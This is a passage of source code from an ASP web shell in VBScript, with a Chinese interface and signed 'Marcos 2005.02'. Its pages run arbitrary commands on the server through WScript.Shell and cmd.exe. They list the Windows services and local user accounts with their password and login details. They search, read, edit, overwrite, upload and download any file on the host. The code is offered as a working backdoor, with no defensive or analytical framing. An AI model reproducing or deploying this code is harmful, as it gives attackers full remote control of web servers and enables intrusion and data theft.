		echo "<body onload=""document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "<input type=hidden name=theAct value=doAct>"
		echo "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
		echo "所在路径: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62><br/>"
		echo "程序文件: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
		echo "<input type=button name=Submit4 value=' 回显 ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""><br/> "
		echo "命令参数: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
		echo "<input type=submit name=Submit value=' 运行 '><br/>"
		echo "<hr/>注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用"">""符号),其它程序只能执行不能回显.<br/>"
		echo "　&nbsp; 由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.<hr/>"
		echo "<iframe id=cmdResult style='width:100%;height:78%;'>"
		echo "</iframe>"
		echo "</form>"
		echo "</body>"
	End Sub

	Sub PageServiceList()
		Dim sa, objService, objComputer
		
		showTitle("系统服务信息查看")
		Set objComputer = GetObject("WinNT://.")
		Set sa = Server.CreateObject("Shell.Application")
		objComputer.Filter = Array("Service")
		
		echo "<ol>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		For Each objService In objComputer
			echo "<li>" & objService.Name & "</li><hr/>"
			echo "<ol>服务名称: " & objService.Name & "<br/>"
			echo "显示名称: " & objService.DisplayName & "<br/>"
			echo "启动类型: " & getStartType(objService.StartType) & "<br/>"
			echo "运行状态: " & sa.IsServiceRunning(objService.Name) & "<br/>"
'			echo "当前状态: " & objService.Status & "<br/>"
'			echo "服务类型: " & objService.ServiceType & "<br/>"
			echo "登录身份: " & objService.ServiceAccountName & "<br/>"
			echo "服务描述: " & getServiceDsc(objService.Name) & "<br/>"
			echo "文件路径及参数: " & objService.Path
			echo "</ol><hr/>"
		Next
		echo "</ol><hr/>Powered By Marcos 2005.02"
		
		Set sa = Nothing
	End Sub
	
	Function getServiceDsc(strService)
		Dim ws
		Set ws = Server.CreateObject("WScript.Shell")
		getServiceDsc = ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\Description")
		Set ws = Nothing
	End Function

	Sub PageTxtSearcher()
		Response.Buffer = True
		Server.ScriptTimeOut = 5000
		Dim keyword, theAct, thePath, theFolder
		theAct = Request("theAct")
		keyword = Trim(Request("keyword"))
		thePath = Trim(Request("thePath"))
		
		showTitle("文本文件搜索器")
		
		If thePath = "" Then
			thePath = Server.MapPath("\")
		End If
		
		echo "FSO文件搜索:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
		echo "路径: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "关键字: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit value=给我搜>"
		echo "</form>"
		echo "<hr/>"
		echo "Shell.Application &amp; Adodb.Stream文件搜索:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>"
		echo "路径: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "关键字: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit2 value=给我搜>"
		echo "</form>"
		echo "<hr/>"
		
		If theAct = "fsoSearch" And keyword <> "" Then
			Set theFolder = fso.GetFolder(thePath)
			Call searchFolder(theFolder, keyword)
			Set theFolder = Nothing
		End If
		
		If theAct = "saSearch" And keyword <> "" Then
			Call appSearchIt(thePath, keyword)
		End If
		
		echo "<hr/>Powered By Marcos 2005.02"
	End Sub
	
	Sub searchFolder(folder, str)
		Dim ext, title, theFile, theFolder
		For Each theFile In folder.Files
			ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
			If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
				echo fileLink(theFile, "")
			End If
			If ext = "asp" Or ext = "asa" Or ext = "cer" Or ext = "cdx" Then
				If searchFile(theFile, str, title, "fso") Then
					echo fileLink(theFile, title)
				End If
			End If
		Next
		Response.Flush()
		For Each theFolder In folder.subFolders
			searchFolder theFolder, str
		Next
	end sub
	
	Function searchFile(f, s, title, method)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, content, pos1, pos2
		
		If method = "fso" Then
			Set theFile = fso.OpenTextFile(f.Path)
			content = theFile.ReadAll()
			theFile.Close
			Set theFile = Nothing
		 Else
			content = streamLoadFromFile(f.Path)
		End If
		
		If Err Then
			Err.Clear
			content = ""
		End If
		
		searchFile = InStr(1, content, S, vbTextCompare) > 0 
		If searchFile Then
			pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
			pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
			title = ""
			If pos1 > 0 And pos2 > 0 Then
				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
			End If
		End If
	End Function
	
	Function fileLink(f, title)
		fileLink = f.Path
		If title = "" Then
			title = f.Name
		End If
		fileLink = "<li><font color=ff0000>" & title & "</font> " & fileLink & "</li>"
	End Function
	
	Sub appSearchIt(thePath, theKey)
		Dim title, extName, objFolder, objItem, fileName
		Set objFolder = sa.NameSpace(thePath)
		
		For Each objItem In objFolder.Items
			If objItem.IsFolder = True Then
				Call appSearchIt(objItem.Path, theKey)
				Response.Flush()
			 Else
				extName = LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
				fileName = Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
				If InStr(LCase(fileName), LCase(theKey)) > 0 Then
					echo fileLink(objItem, "")
				End If
				If extName = "asp" Or extName = "asa" Or extName = "cer" Or extName = "cdx" Then
					If searchFile(objItem, theKey, title, "application") Then
						echo fileLink(objItem, title)
					End If
				End If
			End If
		Next
	End Sub

	Sub PageUserList()
		Dim objUser, objGroup, objComputer
		
		showTitle("系统用户及用户组信息查看")
		Set objComputer = GetObject("WinNT://.")
		objComputer.Filter = Array("User")
		echo "<a href=javascript:showHideMe(userList);>User:</a>"
		echo "<span id=userList><hr/>"
		For Each objUser in objComputer
			echo "<li>" & objUser.Name & "</li>"
			echo "<ol><hr/>"
			getUserInfo(objUser.Name)
			echo "<hr/></ol>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
		echo "<span id=userGroupList><hr/>"
		objComputer.Filter = Array("Group")
		For Each objGroup in objComputer
			echo "<li>" & objGroup.Name & "</li>"
			echo "<ol><hr/>" & objGroup.Description & "<hr/></ol>"
		Next
		echo "</span><hr/>Powered By Marcos 2005.02"

	End Sub
	
	Sub getUserInfo(strUser)
		Dim User, Flags
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set User = GetObject("WinNT://./" & strUser & ",user")
		echo "描述: " & User.Description & "<br/>"
		echo "所属用户组: " & getItsGroup(strUser) & "<br/>"
		echo "密码已过期: " & cbool(User.Get("PasswordExpired")) & "<br/>"
		Flags = User.Get("UserFlags")
		echo "密码永不过期: " & cbool(Flags And &H10000) & "<br/>"
		echo "用户不能更改密码: " & cbool(Flags And &H00040) & "<br/>"
		echo "非全局帐号: " & cbool(Flags And &H100) & "<br/>"
		echo "密码的最小长度: " & User.PasswordMinimumLength & "<br/>"
		echo "是否要求有密码: " & User.PasswordRequired & "<br/>"
		echo "帐号停用中: " & User.AccountDisabled & "<br/>"
		echo "帐号锁定中: " & User.IsAccountLocked & "<br/>"
		echo "用户信息文件: " & User.Profile & "<br/>"
		echo "用户登录脚本: " & User.LoginScript & "<br/>"
		echo "用户Home目录: " & User.HomeDirectory & "<br/>"
		echo "用户Home目录根: " & User.Get("HomeDirDrive") & "<br/>"
		echo "帐号过期时间: " & User.AccountExpirationDate & "<br/>"
		echo "帐号失败登录次数: " & User.BadLoginCount & "<br/>"
		echo "帐号最后登录时间: " & User.LastLogin & "<br/>"
		echo "帐号最后注销时间: " & User.LastLogoff & "<br/>"
		For Each RegTime In User.LoginHours
			If RegTime < 255 Then
				Restrict = True
			End If
		Next
		echo "帐号已用时间: " & Restrict & "<br/>"
		Err.Clear
	End Sub
	
	Function getItsGroup(strUser)
		Dim objUser, objGroup
		Set objUser = GetObject("WinNT://./" & strUser & ",user")
		For Each objGroup in objUser.Groups
			getItsGroup = getItsGroup & " " & objGroup.Name
		Next
	End Function

	Sub PageWsCmdRun()
		Dim cmdStr, cmdPath, cmdResult
		cmdStr = Request("cmdStr")
		cmdPath = Request("cmdPath")
		
		showTitle("WScript.Shell命令行操作")
		
		If cmdPath = "" Then
			cmdPath = "cmd.exe"
		End If
		
		If cmdStr <> "" Then
			If InStr(LCase(cmdPath), "cmd.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
				cmdResult = doWsCmdRun(cmdPath & " /c " & cmdStr)
			 Else
		 		If LCase(cmdPath) = "wscriptshell" Then
					cmdResult = doWsCmdRun(cmdStr)
				 Else
					cmdResult = doWsCmdRun(cmdPath & " " & cmdStr)
				End If
			End If
		End If
		
		echo "<style>body{margin:8;}</style>"
		echo "<body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "路径: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
		echo "<input type=button name=Submit2 value=使用WScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';""><br/>"
		echo "命令/参数: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
		echo "<input type=submit name=Submit value=' 运行 '><br/>"
		echo "<hr/>注: 请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.<hr/>"
		echo "<textarea id=cmdResult style='width:100%;height:78%;'>"
		echo HtmlEncode(cmdResult)
		echo "</textarea>"
		echo "</form>"
		echo "</body>"
	End Sub
	
	Function doWsCmdRun(cmdStr)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fso, theFile
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		
		doWsCmdRun = ws.Exec(cmdStr).StdOut.ReadAll()
		If Err Then
			echo Err.Description & "<br>"
			Err.Clear
			ws.Run cmdStr & " > " & aspPath, 0, True
			Set theFile = fso.OpenTextFile(aspPath)
			doWsCmdRun = theFile.RealAll()
			If Err Then
				echo Err.Description & "<br>"
				Err.Clear
				doWsCmdRun = streamLoadFromFile(aspPath)
			End If
		End If
		
		Set fso = Nothing
	End Function

	Sub PageOther()
		echo "<style>"
		echo "A:visited {color: #333333;text-decoration: none;}"
		echo "A:active {color: #333333;text-decoration: none;}"
		echo "A:link {color: #000000;text-decoration: none;}"
		echo "A:hover {color: #333333;text-decoration: none;}"
		echo "BODY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
		echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}"
		echo "table {font-size: 9pt;}"
		echo "form {margin: 0;}"
		echo "#fsoDriveList span{width: 100px;}"
		echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
		echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
		echo ".font{font-size: 35px;line-height: 40px;}"
		echo "#fileExplorerTools {background-color: buttonFace;}"
		echo ".input {border-width: 1px;}"
		echo "</style>" & vbNewLine
		
		echo "<script language=javascript>" & vbNewLine
		echo "function showHideMe(me){" & vbNewLine
		echo "if(me.innerText == ''){" & vbNewLine
		echo "me.innerText = '\nNo Contents!';" & vbNewLine
		echo "}" & vbNewLine
		echo "if(me.style.display == 'none'){" & vbNewLine
		echo "me.style.display = '';" & vbNewLine
		echo "}else{" & vbNewLine
		echo "me.style.display = 'none';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeMyClass(me){" & vbNewLine
		echo "if(me.className == ''){" & vbNewLine
		echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" & vbNewLine
		echo "usePath.value = me.id;" & vbNewLine
		echo "status = me.title;" & vbNewLine
		echo "me.className = 'anotherSpan';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeThePath(me){" & vbNewLine
		echo "location.href = '?pageName=' + pageName.value + '&thePath=' + me.id;" & vbNewLine
		echo "}" & vbNewLine
		echo "function fixTheLayer(strObj){" & vbNewLine
		echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine
		echo "objStyle.width = document.body.clientWidth;" & vbNewLine
		echo "objStyle.top = document.body.scrollTop + 2;" & vbNewLine
		echo "}" & vbNewLine
		echo "function openUrl(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value);" & vbNewLine
		echo "}" & vbNewLine
		echo "function newOne(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function editFile(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction(act){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function downTheFile(){" & vbNewLine
		echo "if(confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先把文件复制到当前站点目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载.')){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction2(act){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appTheAttributes(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appRename(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function upTheFile(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine
		echo "}" & vbNewLine
		echo "function wsLoadIFrame(){" & vbNewLine
		echo "cmdResult.location.href = '?pageName=SaCmdRun&theAct=readResult';" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoRename(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function delOne(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoGetAttributes(){" & vbNewLine
		echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "</script>"
	End Sub

	Sub openUrl(usePath)
		Dim theUrl, thePath
		
		thePath = Server.MapPath("/")
		
		If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
			theUrl = Mid(usePath, Len(thePath) + 1)
			theUrl = Replace(theUrl, "\", "/")
			If Left(theUrl, 1) = "/" Then
				theUrl = Mid(theUrl, 2)
			End If
			Response.Redirect("/" & theUrl)
		 Else
			alertThenClose("您所要打开的文件不在本站点目录下\n您可以尝试把要打开(下载)的文件粘贴到\n站点目录下,然后再打开(下载)!")
			Response.End
		End If
	End Sub
	
	Sub showEdit(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, unEditableExt
		
		If Right(thePath, 1) = "\" Then
			alertThenClose("编辑文件夹操作是非法的.")
			Response.End
		End If
		
		unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
		
		echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
		echo "<body topmargin=9>"
		echo "<form method=post style='margin:0;width:100%;height:100%;'>"
		echo "<textarea name=fileContent style='width:100%;height:90%;'>"
		If strMethod = "stream" Then
			echo HtmlEncode(streamLoadFromFile(thePath))
		 Else
			Set theFile = fso.OpenTextFile(thePath, 1)
			echo HtmlEncode(theFile.ReadAll())
			theFile.Close
			Set theFile = Nothing
		End If
		echo "</textarea><hr/>"
		echo "<div align=right>"
		echo "保存为:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
		echo "<input type=checkbox name='windowStatus' id=windowStatus"
		If Request.Cookies(m & "windowStatus") = "True" Then
			echo " checked"
		End If
		echo "><label for=windowStatus>保存后关闭窗口</label> "
		echo "<input type=submit value=' 保存 '><input type=hidden value='saveFile' name=theAct>"
		echo "<input type=reset value=' 恢复 '>"
		echo "<input type=button value=' 清空 ' onclick=this.form.fileContent.innerText='';>"
		echo strJsCloseMe & "</div>"
		echo "</form>"
		echo "</body><br/>"
		
	End Sub
	
	Sub saveToFile(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fileContent, windowStatus
		fileContent = Request("fileContent")
		windowStatus = Request("windowStatus")
		
		If strMethod = "stream" Then
			streamSaveToFile thePath, fileContent
			chkErr(Err)
		 Else
			fsoSaveToFile thePath, fileContent
			chkErr(Err)
		End If
		
		If windowStatus = "on" Then
			Response.Cookies(m & "windowStatus") = "True"
			Response.Write "<script>window.close();</script>"
		 Else
			Response.Cookies(m & "windowStatus") = "False"
			Call showEdit(thePath, strMethod)
		End If
	End Sub
	
	Sub fsoSaveToFile(thePath, fileContent)
		Dim theFile
		Set theFile = fso.OpenTextFile(thePath, 2, True)
		theFile.Write fileContent
		theFile.Close
		Set theFile = Nothing
	End Sub
	
	Function streamLoadFromFile(thePath)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			.LoadFromFile thePath
			.LoadFromFile thePath
			If Request("pageName") <> "TxtSearcher" Then
				chkErr(Err)
			End If
			.Charset="gb2312"
			.Position=2
			streamLoadFromFile=.ReadText()
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub downTheFile(thePath)
		Response.Clear
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim stream, fileName, fileContentType

		fileName = split(thePath,"\")(uBound(split(thePath,"\")))
		Set stream = Server.CreateObject("adodb.stream")
		stream.Open
		stream.Type = 1
		stream.LoadFromFile(thePath)
		chkErr(Err)
		Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName
		Response.AddHeader "Content-Length", stream.Size
		Response.Charset = "UTF-8"
		Response.ContentType = "application/octet-stream"
		Response.BinaryWrite stream.Read 
		Response.Flush
		stream.Close
		Set stream = Nothing
	End Sub
	
	Sub showUpload(thePath, pageName)
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post enctype='multipart/form-data' action='?pageName=" & pageName & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>"
		echo "上传文件: <input name=file type=file size=31><br/>保存为: "
		echo "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>"
		echo "<input type=checkbox name=writeMode value=True>覆盖模式<hr/>"
		echo "<input name=Submit type=submit id=Submit value='上 传' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"
		echo  strJsCloseMe
		echo "</form>"
	End Sub
	
	Sub streamUpload(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
		theFile = Request("theFile")
		fileName = Request("fileName")
		overWrite = Request("overWrite")

		If InStr(fileName, ":") <= 0 Then
			fileName = thePath & fileName
		End If

		Set stream = Server.CreateObject("adodb.stream")
		Set streamT = Server.CreateObject("adodb.stream")

		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Request.BinaryRead(Request.TotalBytes)
			.Position = 0
			fileContent = .Read()
			i = InStrB(fileContent, chrB(13) & chrB(10))
			info = LeftB(fileContent, i - 1)
			i = Len(info) + 2
			i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
			j = InStrB(i, fileContent, info) - 1
			streamT.Type = 1
			streamT.Mode = 3
			streamT.Open
			stream.position = i
			.CopyTo streamT, j - i - 2
			If overWrite = "true" Then
				streamT.SaveToFile fileName, 2
			 Else
				streamT.SaveToFile fileName
			End If
			If Err.Number = 3004 Then
				Err.Clear
				fileName = fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\")))
				If overWrite="true" Then
					streamT.SaveToFile fileName, 2
				 Else
					streamT.SaveToFile fileName
				End If
			End If
			chkErr(Err)
			echo("<script language=""javascript"">alert('文件上传成功!\n" & Replace(fileName, "\", "\\") & "');</script>")
			streamT.Close
			.Close
		End With
		
		Set stream = Nothing
		Set streamT = Nothing
	End Sub

	Function getDriveType(num)
		Select Case num
			Case 0
				getDriveType = "未知"
			Case 1
				getDriveType = "可移动磁盘"
			Case 2
				getDriveType = "本地硬盘"
			Case 3
				getDriveType = "网络磁盘"
			Case 4
				getDriveType = "CD-ROM"
			Case 5
				getDriveType = "RAM 磁盘"
		End Select
	End Function

	Function getFileIcon(extName)
		Select Case LCase(extName)
			Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
				getFileIcon = "Wingdings>2"
			Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
				getFileIcon = "Webdings>·"
			Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
				getFileIcon = "'webdings'>&#159;"
			Case "exe", "com", "bat", "cmd", "scr", "msi"
				getFileIcon = "Webdings>1"
			Case "sys", "dll", "ocx"
				getFileIcon = "Wingdings>&#255;"
			Case Else
				getFileIcon = "'Wingdings 2'>/"
		End Select
	End Function

	Function getStartType(num)
		Select Case num
			Case 2
				getStartType = "自动"
			Case 3
				getStartType = "手动"
			Case 4
				getStartType = "已禁用"
		End Select
	End Function
%>